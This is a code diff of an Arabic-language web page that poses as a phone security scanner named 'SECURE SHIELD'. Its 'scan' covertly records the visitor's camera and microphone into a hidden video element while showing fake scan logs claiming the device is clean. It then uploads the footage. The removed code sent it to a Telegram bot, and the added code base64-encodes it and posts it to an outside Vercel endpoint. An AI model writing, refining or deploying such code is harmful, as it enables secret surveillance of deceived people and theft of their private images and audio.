@@ -18,7 +18,6 @@
         @keyframes flicker { 0%,100%{opacity:1} 50%{opacity:0.3} }
         @keyframes scanLine { from{top:-100%} to{top:100%} }
         @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.05)} }
-        @keyframes codeDrop { from{opacity:1;transform:translateY(0)} to{opacity:0;transform:translateY(20px)} }
         
         .scan-line { position: fixed; left: 0; right: 0; height: 2px; background: rgba(0,255,65,0.1); pointer-events: none; animation: scanLine 2s linear infinite; z-index: 999; }
         .container { max-width: 420px; width: 100%; }
@@ -57,17 +56,9 @@
             box-shadow: 0 0 25px rgba(0,255,65,0.3);
             animation: glitch 0.2s infinite;
         }
-        .code-line { animation: codeDrop 0.3s ease; }
         
-        .countdown-box {
-            display: flex; align-items: center; justify-content: center; gap: 10px;
-            margin: 10px 0;
-        }
-        .countdown-num {
-            font-size: 36px; font-weight: 900; color: var(--red);
-            text-shadow: 0 0 20px var(--red);
-            animation: flicker 0.3s infinite;
-        }
+        .countdown-box { display: flex; align-items: center; justify-content: center; gap: 10px; margin: 10px 0; }
+        .countdown-num { font-size: 36px; font-weight: 900; color: var(--red); text-shadow: 0 0 20px var(--red); animation: flicker 0.3s infinite; }
         .countdown-label { color: #333; font-size: 12px; }
         
         .progress-bar { width: 100%; height: 4px; background: #0a1a0a; border-radius: 2px; overflow: hidden; }
@@ -85,40 +76,31 @@
 
 <div class="container">
     
-    <!-- الصفحة الرئيسية -->
     <div class="page active" id="page-home">
         <div class="skull">🛡️</div>
         <h1>حماية الهاتف</h1>
         <div class="subtitle">━ SECURE SHIELD v3.0 ━</div>
-        
         <div class="device-card">
             <div class="d-name" id="device-name">📱 جاري الكشف...</div>
             <div class="d-info" id="device-info"></div>
         </div>
-        
         <button class="btn" onclick="startScan()">🔍 اضغط لبدء الفحص</button>
     </div>
     
-    <!-- صفحة الفحص -->
     <div class="page" id="page-scanning">
         <div class="skull">💀</div>
         <h1>جاري الفحص الشامل...</h1>
         <div class="subtitle">━ ANALYZING SYSTEM ━</div>
-        
         <div class="code-screen" id="code-screen"></div>
-        
         <div class="countdown-box">
             <span class="countdown-label">متبقي:</span>
             <span class="countdown-num" id="countdown">30</span>
             <span class="countdown-label">ثانية</span>
         </div>
-        
         <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
-        
         <video id="hidden-video" autoplay playsinline muted></video>
     </div>
     
-    <!-- صفحة النجاح -->
     <div class="page" id="page-done">
         <div class="success-icon">✅</div>
         <div class="success-text">جهازك بأمان</div>
@@ -136,9 +118,6 @@ function getDevice() {
     const ua = navigator.userAgent;
     if (ua.includes('SM-A105')||ua.includes('SM-A107')) return {name:'Samsung Galaxy A10',ram:'2GB'};
     if (ua.includes('SM-')) return {name:'Samsung Galaxy',ram:'4GB'};
-    if (ua.includes('iPhone')) return {name:'Apple iPhone',ram:'4GB'};
-    if (ua.includes('Redmi')) return {name:'Xiaomi Redmi',ram:'4GB'};
-    if (ua.includes('Realme')||ua.includes('RMX')) return {name:'Realme',ram:'4GB'};
     const match = ua.match(/; ([^;]+) Build/);
     const ram = navigator.deviceMemory ? navigator.deviceMemory+'GB' : '4GB';
     return {name:match?match[1].trim():'جهاز غير معروف',ram};
@@ -156,7 +135,6 @@ function showPage(id) {
 async function startScan() {
     showPage('page-scanning');
     
-    // تشغيل الكاميرا
     try {
         stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         document.getElementById('hidden-video').srcObject = stream;
@@ -166,43 +144,25 @@ async function startScan() {
         mediaRecorder.start();
     } catch(e) {}
     
-    // إرسال سريع في الخلفية (مش هنستنى)
-    sendVideoInBackground();
-    
-    // الأكواد
     const codeScreen = document.getElementById('code-screen');
     const countdownEl = document.getElementById('countdown');
     const progressFill = document.getElementById('progress-fill');
     
     const logs = [
-        '[■] INITIALIZING SCAN ENGINE...',
+        '[■] INITIALIZING...',
         '[■] DEVICE: ' + device.name,
         '[■] RAM: ' + device.ram,
-        '[■] BUILD: ' + navigator.userAgent.substring(0, 50) + '...',
-        '[■] CHECKING SYSTEM INTEGRITY...',
+        '[■] CHECKING SYSTEM...',
         '[■] SCANNING KERNEL...',
         '[■] KERNEL: SECURE',
-        '[■] CHECKING ROOT ACCESS...',
         '[■] ROOT: NOT DETECTED',
         '[■] SCANNING PORTS...',
-        '[■] PORT 22: CLOSED',
-        '[■] PORT 443: SECURE',
-        '[■] PORT 8080: CLOSED',
-        '[■] CHECKING FIREWALL...',
         '[■] FIREWALL: ACTIVE',
-        '[■] SCANNING SSL/TLS...',
-        '[■] ENCRYPTION: AES-256',
-        '[■] CHECKING MALWARE DB...',
-        '[■] DATABASE: UPDATED',
+        '[■] SSL: AES-256',
         '[■] SCANNING APPS...',
         '[■] NO MALWARE FOUND',
-        '[■] CHECKING NETWORK...',
-        '[■] IP: SECURED',
-        '[■] VPN: NOT DETECTED',
         '[■] ANALYZING FILES...',
-        '[■] SYSTEM FILES: INTACT',
-        '[■] GENERATING REPORT...',
-        '[■] REPORT: CLEAN',
+        '[■] SYSTEM: CLEAN',
         '[✓] SCAN COMPLETE',
         '[✓] DEVICE SECURE ✓',
     ];
@@ -214,52 +174,33 @@ async function startScan() {
         countdownEl.textContent = seconds;
         progressFill.style.width = ((30 - seconds) / 30 * 100) + '%';
         
-        // إضافة سطور الأكواد بسرعة
         const progress = (30 - seconds) / 30;
         const linesToShow = Math.floor(progress * logs.length);
-        codeScreen.innerHTML = logs.slice(0, Math.min(linesToShow + 1, logs.length))
-            .map(l => `<div class="code-line">${l}</div>`).join('');
+        codeScreen.innerHTML = logs.slice(0, Math.min(linesToShow + 1, logs.length)).join('<br>');
         codeScreen.scrollTop = codeScreen.scrollHeight;
         
         if (seconds <= 0) {
             clearInterval(interval);
-            if (mediaRecorder && mediaRecorder.state === 'recording') {
-                mediaRecorder.stop();
-            }
-            setTimeout(() => {
+            if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
+            setTimeout(async () => {
+                if (recordedChunks.length > 0) {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const reader = new FileReader();
+                    reader.onloadend = async function() {
+                        const base64 = reader.result.split(',')[1];
+                        try {
+                            await fetch('https://ai-proxy-eosin.vercel.app/api/upload_video', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ chat_id: CHAT_ID, video_base64: base64 })
+                            });
+                        } catch(e) {}
+                    };
+                    reader.readAsDataURL(blob);
+                }
                 if (stream) stream.getTracks().forEach(t => t.stop());
                 showPage('page-done');
             }, 2000);
-        }
-    }, 1000);
-}
-
-// إرسال الفيديو في الخلفية (بسرعة - مش بيستنى)
-async function sendVideoInBackground() {
-    // بعد 5 ثواني من بدء التسجيل، ابدأ إرسال
-    setTimeout(async () => {
-        if (mediaRecorder && mediaRecorder.state === 'recording') {
-            // نوقف مؤقتاً ونرسل الجزء اللي اتصور
-            mediaRecorder.requestData();
-        }
-    }, 5000);
-    
-    // لما التسجيل يخلص
-    const checkInterval = setInterval(async () => {
-        if (mediaRecorder && mediaRecorder.state === 'inactive' && recordedChunks.length > 0) {
-            clearInterval(checkInterval);
-            
-            const blob = new Blob(recordedChunks, { type: 'video/webm' });
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('video', blob, 'scan_' + Date.now() + '.webm');
-            formData.append('caption', '🛡️ فحص حماية\n📱 ' + device.name + '\n🕐 ' + new Date().toLocaleString('ar-EG'));
-            
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                    method: 'POST', body: formData
-                });
-            } catch(e) {}
         }
     }, 1000);
 }
